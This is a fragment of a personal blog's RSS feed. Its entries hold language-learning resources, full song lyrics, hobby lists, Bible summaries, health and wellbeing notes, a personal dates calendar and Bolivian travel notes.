https://www.nhk.or.jp/lesson/ja/ https://open.spotify.com/playlist/2grEO8M5oo1xsjNU9LRyqW https://www.tofugu.com/learn-japanese/ https://tsunagarujp.bunka.go.jp/level01/a01 https://www.youtube.com/watch?v=rZTN5QG0nUM https://www.youtube.com/watch?v=6p9Il_j0zjc&amp;amp;list=WL&amp;amp;index=212 https://www.youtube.com/watch?v=6p9Il_j0zjc&amp;amp;list=WL&amp;amp;index=175&amp;amp;t=297s Readings 鬼滅の刃 bookwalker Death Note: JP Bookwalker Movies Anything from Ghibli かぐや姫の物語 ( ghibli ) Music Yutaka Ozaki: spotify Song: Forget me not, Yutaka. lyrics - youtube Reading local ├── Genki - Elementary Japanese II.pdf ├── Genki I - textboock.pdf</description></item><item><title/><link>https://www.darvein.net/lang/ru/basic-russian/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/ru/basic-russian/</guid><description>Russian Basics &amp;#x1f1f7;&amp;#x1f1fa; Resources Movie: Battleship Potemkin (1925) - Directed by Sergei Eisenstein Solaris (1972) - Directed by Andrei Tarkovsky Moscow Does Not Believe in Tears (1980) - Directed by Vladimir Menshov Come and See (1985) - Directed by Elem Klimov Stalker (1979) - Directed by Andrei Tarkovsky Greetings trans -b -p en:zh-CN hello
Hello: Здравствуйте (Zdravstvuyte) Hi / Bye: Привет / Пока (Privet / Poka) - informal Goodbye: До свидания (Do svidaniya) Thank you: Спасибо (Spasibo) You&amp;rsquo;re welcome: Пожалуйста (Pozhaluysta) Sorry / Excuse me: Извините (Izvinite) Yes: Да (Da) No: Нет (Nyet) How are you?</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-15night-yutaka-ozaki/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-15night-yutaka-ozaki/</guid><description>JP: 尾崎豊 - 15の夜 &amp;#x1f3b5; Youtube Link: https://www.youtube.com/watch?v=Yu88zx_--wE Translation: https://lyricstranslate.com/en/juugo-no-yoru-night-night-fifteen-years-old.html Hiragana:
落書きの教科書と外ばかり見てる俺 超高層ビルの上の空 届かない夢を見てる やりばのない気持の扉破りたい 校舎の裏 煙草をふかして見つかれば逃げ場もない しゃがんでかたまり 背を向けながら 心のひとつも解りあえない大人達をにらむ そして仲間達は今夜家出の計画をたてる とにかくもう 学校や家には帰りたくない 自分の存在が何なのかさえ 解らず震えている 15の夜 盗んだバイクで走り出す 行き先も解らぬまま 暗い夜の帳りの中へ 誰にも縛られたくないと 逃げ込んだこの夜に 自由になれた気がした 15の夜 冷たい風 冷えた躰 人恋しくて 夢見てるあの娘の家の横を サヨナラつぶやき走り抜ける 闇の中 ぽつんと光る 自動販売機 100円玉で買えるぬくもり 熱い缶コーヒー握りしめ 恋の結末も解らないけど あの娘と俺は将来さえ ずっと夢に見てる 大人達は心を捨てろ捨てろと言うが 俺はいやなのさ 退屈な授業が俺達の全てならば なんてちっぽけで なんて意味のない なんて無力な 15の夜 盗んだバイクで走り出す 行き先も解らぬまま 暗い夜の帳りの中へ 覚えたての煙草をふかし 星空を見つめながら 自由を求め続けた 15の夜 盗んだバイクで走り出す 行き先も解らぬまま 暗い夜の帳りの中へ 誰にも縛られたくないと 逃げ込んだこの夜に 自由になれた気がした 15の夜 https://lyricstranslate.com Romanji</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-carla-lexcessive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-carla-lexcessive/</guid><description>FR: Carla Bruni - L&amp;rsquo;excessive &amp;#x1f3b5; Youtube Link: https://www.youtube.com/watch?v=2K5n2nRtF0c Je n&amp;#39;ai pas d&amp;#39;excuse C&amp;#39;est inexplicable Même inexorable C&amp;#39;est pas pour l&amp;#39;extase C&amp;#39;est que l&amp;#39;existence Sans un peu d&amp;#39;extrême Est inacceptable J&amp;#39;suis excessive J&amp;#39;aime quand ça désaxe Quand tout accélère Moi je reste relax J&amp;#39;suis excessive Quand tout explose Quand la vie s&amp;#39;exhibe C&amp;#39;est une transe exquise Y en a qu&amp;#39;ça excède, d&amp;#39;autres que ça vexe Y en a qui exigent que j&amp;#39;revienne dans l&amp;#39;axe Y en a qui s&amp;#39;exclament que c&amp;#39;est un complexe Y en a qui s&amp;#39;excitent avec tous ces X dans l&amp;#39;texte J&amp;#39;suis excessive J&amp;#39;aime quand ça désaxe Quand tout accélère Moi je reste relax J&amp;#39;suis excessive Quand tout explose Quand la vie s&amp;#39;exhibe C&amp;#39;est une transe exquise, oui J&amp;#39;suis excessive J&amp;#39;aime quand ça désaxe Quand tout exagère Moi je reste relax J&amp;#39;suis excessive Excessivement gaie Excessivement triste C&amp;#39;est là que j&amp;#39;existe Pas d&amp;#39;excuse (pas d&amp;#39;excuse) Translation</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-edith-no-regret/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-edith-no-regret/</guid><description> FR: Edith Piaf - Non, je ne regrette rien &amp;#x1f3b5; Youtube Link: Edith Piaf - Non, je ne regrette rien Non, rien de rien Non, je ne regrette rien Ni le bien qu&amp;#39;on m&amp;#39;a fait Ni le mal Tout ça m&amp;#39;est bien égal Non, rien de rien Non, je ne regrette rien C&amp;#39;est payé, balayé, oublié Je me fous du passé Avec mes souvenirs J&amp;#39;ai allumé le feu Mes chagrins, mes plaisirs Je n&amp;#39;ai plus besoin d&amp;#39;eux Balayé les amours Avec leurs trémolos Balayé pour toujours Je repars à zéro Non, rien de rien Non, je ne regrette rien Ni le bien qu&amp;#39;on m&amp;#39;a fait Ni le mal Tout ça m&amp;#39;est bien égal Non, rien de rien Non, je ne regrette rien Car ma vie Car mes joies Aujourd&amp;#39;hui Ça commence avec toi</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-em-lose-yourself/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-em-lose-yourself/</guid><description>EN: Eminem - Loose yourself &amp;#x1f3b5; Youtube Link: Eminem - Lose Yourself (Official Video) (Explicit) Lyrics:
Look If you had One shot Or one opportunity To seize everything you ever wanted In one moment Would you capture it Or just let it slip? Yo His palms are sweaty, knees weak, arms are heavy There&amp;#39;s vomit on his sweater already, mom&amp;#39;s spaghetti He&amp;#39;s nervous, but on the surface he looks calm and ready To drop bombs, but he keeps on forgettin&amp;#39; What he wrote down, the whole crowd goes so loud He opens his mouth, but the words won&amp;#39;t come out He&amp;#39;s chokin&amp;#39;, how, everybody&amp;#39;s jokin&amp;#39; now The clocks run out, times up, over, blaow Snap back to reality, ope there goes gravity Ope, there goes Rabbit, he choked He&amp;#39;s so mad, but he won&amp;#39;t give up that easy?</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-em-the-way-i-am/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-em-the-way-i-am/</guid><description>EN: Eminem - The Way I Am &amp;#x1f3b5; Youtube Link: Eminem - The Way I Am (Dirty Version) Lyrics:
[Intro] Dre, just let it run Ayo, turn the beat up a little bit Ayo This song is for anyone Fuck it, just shut up and listen Ayo [Verse 1] I sit back with this pack of Zig-Zag&amp;#39;s and this bag Of this weed, it gives me the shit needed to be The most meanest MC on this, on this Earth And since birth I&amp;#39;ve been cursed with this curse to just curse And just blurt this berserk and bizarre shit that works And it sells and it helps in itself to relieve All this tension, dispensin&amp;#39; these sentences Gettin&amp;#39; this stress that&amp;#39;s been eatin&amp;#39; me recently off Of this chest and I rest again peacefully (Peacefully) But at least have the decency in you To leave me alone, when you freaks see me out In the streets when I&amp;#39;m eatin&amp;#39; or feedin&amp;#39; my daughter To not come and speak to me (Speak to me), I don&amp;#39;t know you And no, I don&amp;#39;t owe you a motherfuckin&amp;#39; thing I&amp;#39;m not Mr.</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-joe-les-champs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-joe-les-champs/</guid><description> FR: Joe Dassin - Les Champs-Elysées &amp;#x1f3b5; Youtube Link: https://www.youtube.com/watch?v=1JhYYUWOBBs Je m&amp;#39;baladais sur l&amp;#39;avenue le cœur ouvert à l&amp;#39;inconnu J&amp;#39;avais envie de dire bonjour à n&amp;#39;importe qui N&amp;#39;importe qui et ce fut toi, je t&amp;#39;ai dit n&amp;#39;importe quoi Il suffisait de te parler, pour t&amp;#39;apprivoiser Aux Champs-Elysées, aux Champs-Elysées Au soleil, sous la pluie, à midi ou à minuit Il y a tout ce que vous voulez aux Champs-Elysées Tu m&amp;#39;as dit &amp;#34;J&amp;#39;ai rendez-vous dans un sous-sol avec des fous Qui vivent la guitare à la main, du soir au matin&amp;#34; Alors je t&amp;#39;ai accompagnée, on a chanté, on a dansé Et l&amp;#39;on n&amp;#39;a même pas pensé à s&amp;#39;embrasser Aux Champs-Elysées, aux Champs-Elysées Au soleil, sous la pluie, à midi ou à minuit Il y a tout ce que vous voulez aux Champs-Elysées Hier soir, deux inconnus et ce matin sur l&amp;#39;avenue Deux amoureux tout étourdis par la longue nuit Et de l&amp;#39;Étoile à la Concorde, un orchestre à mille cordes Tous les oiseaux du point du jour chantent l&amp;#39;amour Aux Champs-Elysées, aux Champs-Elysées Au soleil, sous la pluie, à midi ou à minuit Il y a tout ce que vous voulez aux Champs-Elysées Aux Champs-Elysées, aux Champs-Elysées Au soleil, sous la pluie, à midi ou à minuit Il y a tout ce que vous voulez aux Champs-Elysées  Aux Champs-Elysées, aux Champs-Elysées Au soleil, sous la pluie, à midi ou à minuit</description></item><item><title/><link>https://www.darvein.net/lang/songs/song-wutangclan-cream/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/songs/song-wutangclan-cream/</guid><description>EN: Wu-Tang Clan &amp;#x1f3b5; Youtube Link: Wu-Tang Clan - C.R.E.A.M. Lyrics:
[Verse 1] I grew up on the crime side, the New York Times side Stayin&amp;#39; alive was no jive Had secondhands, Moms bounced on old man So then we moved to Shaolin land A young youth, yo, rockin&amp;#39; the gold tooth, &amp;#39;Lo goose Only way I begin the G off was drug loot And let&amp;#39;s start it like this, son Rollin&amp;#39; with this one and that one, pullin&amp;#39; out gats for fun But it was just a dream for the teen Who was a fiend, started smokin&amp;#39; woolies at sixteen And runnin&amp;#39; up in gates and doin&amp;#39; hits for high stakes Makin&amp;#39; my way on fire escapes No question, I would speed for cracks and weed The combination madе my eyes bleed No question, I would flow off and try to gеt the dough off Stickin&amp;#39; up white boys on ball courts My life got no better, same damn &amp;#39;Lo sweater Times is rough and tough like leather Figured out I went the wrong route So I got with a sick-tight clique and went all out Catchin&amp;#39; ki&amp;#39;s from &amp;#39;cross seas Rollin&amp;#39; in MPVs, every week we made forty G Yo, brothas, respect mine or here go the TEC-9, ch-pow Move from the gate now [Verse 2] It&amp;#39;s been twenty-two long, hard years, I&amp;#39;m still strugglin&amp;#39; Survival got me buggin&amp;#39; But I&amp;#39;m alive on arrival, I peep at the shape of the streets And stay awake to the ways of the world &amp;#39;cause **** deep A man with a dream with plans to make cream Which failed, I went to jail at the age of fifteen A young buck sellin&amp;#39; drugs and such, who never had much Tryin&amp;#39; to get a clutch at what I could not touch (Touch) The court played me short, now I face incarceration Pacin&amp;#39;, goin&amp;#39; upstate&amp;#39;s my destination Handcuffed in back of a bus, forty of us Life as a shorty shouldn&amp;#39;t be so rough But as the world turned, I learned life is hell Livin&amp;#39; in the world no different from a cell Every day I escape from jakes givin&amp;#39; chase Sellin&amp;#39; base, smokin&amp;#39; bones in the staircase Though I don&amp;#39;t know why I chose to smoke sess I guess that&amp;#39;s the time when I&amp;#39;m not depressed But I&amp;#39;m still depressed, and I ask, what&amp;#39;s it worth?</description></item><item><title/><link>https://www.darvein.net/me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/me/</guid><description>Darvein space! Welcome to my personal blog!!1
A little bit about me&amp;hellip;, I&amp;rsquo;m not a fluent-speaker person although I&amp;rsquo;m improving my social skills everyday. Anyways, here you have some things if you want to know me.
Nationality: Bolivian &amp;#x1f1e7;&amp;#x1f1f4; Fav music: Rock and Rap Fav OS: Arch Linux &amp;#x1f427; Movies: I prefer horror and sci-fi movies &amp;#x1f4fa; What I write about&amp;hellip; Link Topic Self All related to oneself: mind, physical and spiritual Books All my read books in one single place Langs My roadmap into becoming Polyglot Travel Notes on my traveling experience Misc Anything.</description></item><item><title/><link>https://www.darvein.net/misc/board-games/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/board-games/</guid><description> Board Games Cool table games:
Origami Chess Legos Monopoli Poker Chess Openings Sicilian Vienna Game Resources https://en.chessbase.com/ https://chess.com</description></item><item><title/><link>https://www.darvein.net/misc/guitar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/guitar/</guid><description> Guitar Fav pieces:
As the world falls down Cant help Falling in Love Guitar - Knockin&amp;rsquo; On Heaven&amp;rsquo;s Door Here Comes The Sun - Beatles Fav pieces:
Title Song Casita URL MISSING</description></item><item><title/><link>https://www.darvein.net/misc/legos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/legos/</guid><description> Legos One of the first tries! &amp;#x2015; First lego completed! &amp;#x2015;</description></item><item><title/><link>https://www.darvein.net/misc/movies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/movies/</guid><description>Movies Movies Series &amp;#x1f517; Breaking Bad 2008 - 2013 &amp;#x1f517; The Office 2005-2013 &amp;#x1f517; Beavis and Butt-head 1993-2011 &amp;#x1f517; Mind your language 1977-1986 Motivationals &amp;#x1f517; Coach Carter 2005 &amp;#x1f517; Gifted Hands 2009 &amp;#x1f517; Stand and Deliver 1988 Tales &amp;#x1f517; Harriet 2019 Horror &amp;#x1f517; Prey for the Devil 2022 &amp;#x1f517; Carrie 1976 &amp;#x1f517; Carrie 2013 &amp;#x1f517; Exorcism 1973 &amp;#x1f517; The Shining 1980 &amp;#x1f517; Posession 1981 Weird &amp;#x1f517; A clockwork orange 1971 Kids Everything from Ghiblin Studios The Labyrinth Pending Movies To Watch (Ignore this!</description></item><item><title/><link>https://www.darvein.net/misc/music/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/music/</guid><description>Music Music link: Canserbero Pending Music To Review (Ignore this!!) Classical artists Frédéric Chopin Johann Sebastian Bach Franz Liszt Claude Debussy Sergei Rachmaninoff Ludwig van Beethoven Pyotr Ilyich Tchaikovsky Robert Schumann Felix Mendelssohn Maurice Ravel Music to explore Random:
Fly me to the moon Smile - Chaplin Rosana - Si tu no estas aqui Piano Piano: Clair de lune Piano: Chopin - Prelude op 28 no 7 in A major Piano: Twinkle 1&amp;amp;2 Variations Piano: Satie - Gymnopédie No.</description></item><item><title/><link>https://www.darvein.net/misc/origamis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/origamis/</guid><description> Origamis Simple Rana &amp;#x2015; Rana Saltarina Origami &amp;#x2015; Perrito &amp;#x2015; Perrito Origami &amp;#x2015;</description></item><item><title/><link>https://www.darvein.net/misc/piano/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/misc/piano/</guid><description> Piano Fav pieces:
Title Song Satie - Gymnopédie No. 1 URL MISSING</description></item><item><title/><link>https://www.darvein.net/p82/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/p82/</guid><description>Priv82 Dates Diciembre 2: Hackmeeting Bo 6: alisca hbd 18: alan hbd 17: vacaciones verano 25: navidad Enero 7: mama hbd Febrero 20, 21: carnavales Marzo 13: Posible techado casa (?) 20-24: semana vacaciones franco (1) Abril 7: viernes santo 27: dy hbd Mayo 1: dia trabajador 5: ll hbd 15-19: vacaciones fr (2) 22-26: vacaciones fr (3) Junio 8: corpus cristi 21: año nuevo aymara Julio 10-14: semana vacaciones fr (invierno) 17-21: semana vacaciones fr (invierno) 24-28: semana vacaciones fr (invierno) Agosto 7: independencia bolivia ( 6 agosto) Septiembre 10-15: semana vacaciones fr (4) Octubre 8: D&amp;amp;L 29-03nov: vacaciones fr (4) Noviembre 2: todos santos 2, 3, 4: Ekoparty Ar List of Tech Events February Hashitalks: https://events.</description></item><item><title/><link>https://www.darvein.net/self/rural/cocina/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/rural/cocina/</guid><description>Cocina Content Cocinar Content Notas Desayuno Almuerzo: Ensalda de verduras con Pollo Notas Importante tomar 3L de agua diario Macro-nutrientes: proteínas y carbohidratos Micro-nutrientes: vitamínas y minerales Desayuno Ajo, Jengribre, Miel Agua con Limón Huevo cocido 12min Palta + Queso + Tomate cherry Pan Almuerzo: Ensalda de verduras con Pollo Meter el Pollo en Agua hirviendo, por 20 minutos 1.1. Poner Sal y Ajo a gusto Meter la Zanahoria y Brócoli, por 10 minutos Aparte, preparar ensalada de Palta, Tomate y Queso Picar Espinaca &amp;#x2015; Ingredientes a usar &amp;#x2015; &amp;#x2015; Pollo hiviendo por 20 min &amp;#x2015; &amp;#x2015; Palta, queso y tomate &amp;#x2015; &amp;#x2015; Zanahoria y Brócoli picado &amp;#x2015; &amp;#x2015; Espinaca Picada &amp;#x2015; &amp;#x2015; Listo para comer!</description></item><item><title/><link>https://www.darvein.net/self/self/bible/mateo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/bible/mateo/</guid><description>Mateo Puntos de resumen Jesus engendrador por Maria por el Espíritu Santo, Jose fue animado por un angel del Señor. Los magos fueron al nacimiento de Jesus, Herodes intento ir pero sin éxito. Jose tomo a Maria y Jesus para huir a Egipto. Herodes mando a matar a todos los niños de Jerusalén Belen. Luego de muchos años luego de que Herodes muriera se fueron a Israel Nazaret. Juan bautizo a Jesus en el rio Jordan Jesus estuvo en el desierto por el Espíritu Santo, ayuno 40 días y noches.</description></item><item><title/><link>https://www.darvein.net/self/self/bible/proverbs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/bible/proverbs/</guid><description>Proverbios Proverbios del Rey Salomon. Resumen y puntos clave del libro.
Content Proverbios Content Summary Escuchar y entender el mensaje Sabiduria y Jehova Los malos, orgullozos, necios e insensatos Padres e hijos Castigo Esposos Justicia Sabiduria e inteligencia Ignorancia Trabajo y Disciplina Flojera Liderazgo Humildad Emociones Paciencia Prudencia Riquezas Paz Debilidades del cuerpo y Placeres Summary Escuchar y entender el mensaje Siempre escuchar y entender Buscar consejeros para afirmar nuestros pensamientos El que escucha las amonestaciones de la vida entre sabios vivirá Apreciar la instrucción y reprension Dónde no hay dirección cae el pueblo, pero con varios consejeros hay seguridad Sabiduria y Jehova El temor a Jehová es el principio de la sabiduría Busca y pide sabiduría, temeraz a Jehová y hallarás el conocimiento de Dios Reconoce a Jehová en todos tus caminos, no solo te apoyes en tu prudencia Jehová con sabiduría creo los cielos y la tierra La sabiduría estaba con Dios durante la creación del universo, y fue puesta entre los hombres en la parte habitable de la tierra Los ojos de Jehová está en todo lugar con los buenos y malos Encomienda a Jehová tus obras y tus pensamientos serán afirmados Cuando tú camino es correcto, Jehová hasta a tus enemigos les hace estar en paz contigo La maldición nunca vendrá sin causa Palabras de Agur: dame el pan necesario, si me das mucho me saciare y te desconocerse, si me das poco robaré al pobre Los malos, orgullozos, necios e insensatos Los insensatos desprecian la sabiduría y enseñanzas Los simples y los burlones no son bien vistos No andes por el camino de los malos, no andes por la oscuridad Lo que aborrece Jehová: ojos altivos, mentiras, manos derraman sangre inocente, pensamientos inicios, pies que corren al mal, El necio será siervo del sabio de corazón Cómo perro que vuelve a su vomito así es el necio que vuelve a su necedad Impío, no aseches al justo, siete veces cae el justo y siete de levanta, el malo caers en el mal Padres e hijos Escuchar la Instrucción del Padre y la Dirección de la Madre Salomon también fue hijo de su padre y delicado y único ante su madre Guarda los mandamientos de tu padre en el corazón El hijo recibo el consejo del padre El hijo necio es pesadumbre s su padre y amargura s su madre Instruye al niño en su camino, incluso de viejo no se apartará de el Corona de los viejos son los nietos y la honra de los hijos sus padres Castigo Jehová también castiga, no te fatigues de su corrección El que detiene el castigo a su hijo aborrece, más el que lo ama lo corrige desde temprano Los azotes que hieren son medicina para el malo, el castigo purifica el corazón No rehuses corregir al muchacho, si lo castigas con vara no morirá La vara y la corrección dan sabiduría Esposos Alégrate con la mujer de tu juventud, disfruta sus caricias y recreate en su amor La mujer virtuosa es corona de su marido La mujer sabía edifica su casa no la destruye Esposo honrar a la esposa trabajadora Lemuel: mujer virtuosa trabaja con voluntad, trae el pan de lejos, se levanta aún de noche y da alimento a su familia.</description></item><item><title/><link>https://www.darvein.net/self/self/christianity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/christianity/</guid><description> Christianity All people that believe in God through Jesus is Christian. A subset of that group is Catholic which has some differences (the most releventas: Pope, Eucharist, Santa Maria)
Vistazo de la Biblia ANTIGUO TESTAMENTO Genesis: creacion mundo, el pecado, dios elige una nacion principal Exodo: liberacion y derramamiento sangre Leviticos: Sacrificios a Dios santo, como acercarse a Dios Numeros: Desobediencia a Dios de Israel, Dios confia en Israel aun Deutoronomios: Moises e Israel antes de entrar a la tierra prometida Josue: Posescion de la tierra prometida, el regalo de Dios Jueces: Infidelidad de Israel con Dios, fidelidad de Dios con Israel Rut: Dios cuida su pueblo Samuel 1 y 2: Saul rey, Dios elige David como rey Reyes 1 y 2: Division del pueblo en Israel Norte y Judan Sur Cronicas 1 y 2: Dios fiel a su pueblo y pacto con David Esdras: Restauracion social y moral del pueblo del exiglio Nehemias: Reconstruccion de Jesuralem Esther: Dios cuida a su pueblo en su exilio Job: Confia en Dios a pesar de todos Salmos: Alabanzas a Dios Proverbios: Sabidurias e instruccion de salomon Eclesiastes: Dificil vida bajo el sol, mundo confuso, esperanza en Dios Cantares: Amor marital Isaias: El salvador de Juda restaurara Jeremias: Cautiverio y sufrimiento de Juda y derrota de sus enemigos Lamentacionse: Destruccion del templo y captura de Jerusalem Esequiel: Advertencia destruccion y restauracion de los judios Daniel: Pueblo judio en el exilio, animos Oseas: Dios es fiel a Israel Joel: Profesias Amos: Israel sera jugado por Dios Abdias: Dios protegera a su pueblo de otros que lo juzguen Jonas: Plan de Dios para la salvacion Miqueas: Injusticias de Juda y justicia de Dios Nahum: Profecia destruccion de pueblo rebelde Habacuc: Profeta questiona a Dios, pero concluye que es Soberano Sofonias: Dia del senior esta cerca Hageo: Restaurar el templo Zacarias: Dios mantiene pacto con Israel atravez del Mesias Malaquias: Arrepentimiento para la venida del Senor NUEVO TESTAMENTO Mateo: Jesus es el rey profetizado Marcos: Jesus y ensenanzas Lucas: Jesus es perfecto Juan: Jesus Dios encargado Hechos: Buenas nuevas Romanos: Justificacion del hombre, doctrinas Corintios 1: Pablo alienta a iglesia Corintios 2: Sufrimiento de Pablo Galatas: Luego de Cristo nueva era Efesios: Reconciliacion con Dios por Jesus Filipensos: Pablo anima a la iglesia Colosenses: Cristo es el senor Tesalonisenses 1: Segunda venida de Cristo Tesalonisenses 2: Segunda venida y rebelion del anticristo, Jesus justicia Timoteo 1: Practicas del evangelio en los creyentes, verdadera doctrina Timoteo 2: Pablo, perseverancia en el evangelio Tito: Fe y practicas Filemon: Conflicto personal, poder del evangelio para la vida Hebreos: Cristo es mejor a todos, superior al viejo pacto Santiago: Practicas en la vida con nuestra fe Pedro 1: Pedro perseguido, pide esperanza Pedro 2: Cristo da poder a los creyentes Juan 1: Verdadera doctrina Juan 2: Amor de Dios Juan 3: Perseverancia Judas: Lealtad y fidelidad Apocalipsis: Sufrimiento y Esperanza Summary of Bible &amp;#x1F5D2; Mateo &amp;#x1F5D2; Proverbios</description></item><item><title/><link>https://www.darvein.net/self/self/dreams/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/dreams/</guid><description> My dreams Results of a coaching process. Here the ref pics &amp;#x1f606;:
&amp;#x2015; Travel and meet new people &amp;#x2015; &amp;#x2015; Meet my heros &amp;#x2015; &amp;#x2015; Family strong union &amp;#x2015; &amp;#x2015; My own bookstore &amp;#x2015; &amp;#x2015; Create companies &amp;#x2015; &amp;#x2015; Be part of a Strong Community &amp;#x2015; &amp;#x2015; Make business networking &amp;#x2015; &amp;#x2015; Write Books &amp;#x2015; &amp;#x2015; Become a Muay Thai coach &amp;#x2015; &amp;#x2015; Learn languages &amp;#x2015; &amp;#x2015; Piano Guitar &amp;#x2015;</description></item><item><title/><link>https://www.darvein.net/self/self/emotions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/emotions/</guid><description> Emotions Emotions Management It is important whenever you are starting to have strong feelings to stop a moment and recognize what you are feeling and what caused it. Self-awareness. We cannot just ignore what we feel, some emotions can have bad effects in our body.
Notes: Some emotions:
Fear Happiness Sadness Surprise Anger Contempt Pride Guilt Jealous Shame</description></item><item><title/><link>https://www.darvein.net/self/self/health/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/health/</guid><description> Health Content Health Content Natural Medicine Pharmaceutical Drugs Sleep and rest Natural Medicine Some notes on natural medicinal or medicinal plants
Mix of Natural and Pharmaceutical drugs can have harmful impact Quality can vary between natural vs pharmaceutical Natural medicine can also have side effects Some plants:
Aloe Vera: burns, wounds, skin irritations Ginger: solves digestive issues Turmeric: (curcuma) antioxidants Garlic: cardiovascular and immune-boosting props Echinacea: fight infections and boost immune system Chamomile: (manzanilla) releve stress and aid sleep Cannabis: pain relief Pharmaceutical Drugs Magnesium Citrate: water retainer, laxative Omega 3 suplements: nutrient, source of energy Ibulprofen: pain reliever Amoxicillin: antibiotic Ciprofloxacin: antibiotic Citalopram, Fluoxetine: antidepressants Sleep and rest Good quality of REM helps Cognitive functions to work correctly (memory, emotions) We usually have 4-6 cycles of sleep being REM the last stage on each cycle During REM Body repairs and regrow tissues builds bones and muscle strengthens inmune system Stages (~90min each) stage1, 5-10 min: trying to sleep, easy to wake-up stage2, 10-25 min: hearth rate slows, body getting ready for deep sleep stage3, 10-30 min: harder to wakeup, REM stage</description></item><item><title/><link>https://www.darvein.net/self/self/wellbeing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/self/wellbeing/</guid><description>Wellbeing Foundamental Physical health:
Exercise daily 40-60min Cold showers Practice martial arts Learn to cook and eat healthy Mental health:
Strong emotional intelligence Be practive Emotions Be tolerant and patiente Be stress tolerant Anticipate to scenarios/facts Medidate Read books Hangout with relatives and friends Study and work hard! Spirituality and faith:
Have strong believe in yourself, in God, in Life Read the bible Understand Judaism vs Christianity Write a journal Man Provides to the tribe Take care of tribe Lead the tribe Competes with others DONTs for a Man Thinking on girls all the time Social media posts all day Look for external validation or acceptation Insecure.</description></item><item><title/><link>https://www.darvein.net/self/urban/fight/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/self/urban/fight/</guid><description>Martial Arts Content Martial Arts Content Muay-Thai Jiu-Jitsu Resources MMA Related posts Box Check this inspirational video: https://www.youtube.com/watch?v=9k4bjNgEOpY Muay-Thai Militar martial art (not sport) &amp;ldquo;Muay Boran&amp;rdquo;. Muaythai means &amp;ldquo;Thai Boxing&amp;rdquo;: มวยไทย
Heros:
Samart Payakaroon Buakaw Saenchai Rodtang There are rules for MuayThai:
Don&amp;rsquo;t knee or kick the opponent while he is on the ground Don&amp;rsquo;t hit the spine back or the back of the head Don&amp;rsquo;t bite Dont hit low blow Jiu-Jitsu Heros:</description></item><item><title/><link>https://www.darvein.net/travel/bo/lapaz/coroico/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/bo/lapaz/coroico/</guid><description> Coroico Lugares Cascadas de San Jacinto y San Félix (Jalancha) Tocaña Complejo Turístico LEQUE Parque Acuático Paola Laguna Cedro Mayo Trekking - Cerro Uchumachu Hospedaje Hostal Atalias Cabaña de Gus Gastronomia La Tierra de Mi Pueblo (Truchas, Pongo) Calle Gregorio Pacheco (Calle de comidas) Multimedia All my photos at Coroico: https://photos.app.goo.gl/e8q1VzWVYSPc9GU18 Related posts Another trip to Coroico</description></item><item><title/><link>https://www.darvein.net/travel/bo/lapaz/cota%C3%B1a/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/bo/lapaz/cota%C3%B1a/</guid><description> Cotaña Posts related to Cotaña Un viajecito rapidito nomás</description></item><item><title/><link>https://www.darvein.net/travel/bo/lapaz/lapaz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/travel/bo/lapaz/lapaz/</guid><description>La Paz Ciudad Mirador Killi Killi El Montículo Feria 16 de julio, Domingos, El Alto Valle de la Luna Psicinas: Los Leones, Martes-Doming 12pm-7pm. El Alto Psicinas: Gran Sauna 16 de Julio, El Alto Aire libre: Cotacota: La laguna de cotacota Calacoto: Parque de las cholas Miraflores: Laikacota Miraflores: Jardin botánico Juegos cerrados: Irpavi: Megacenter playground adultos Cotacota: Playground? 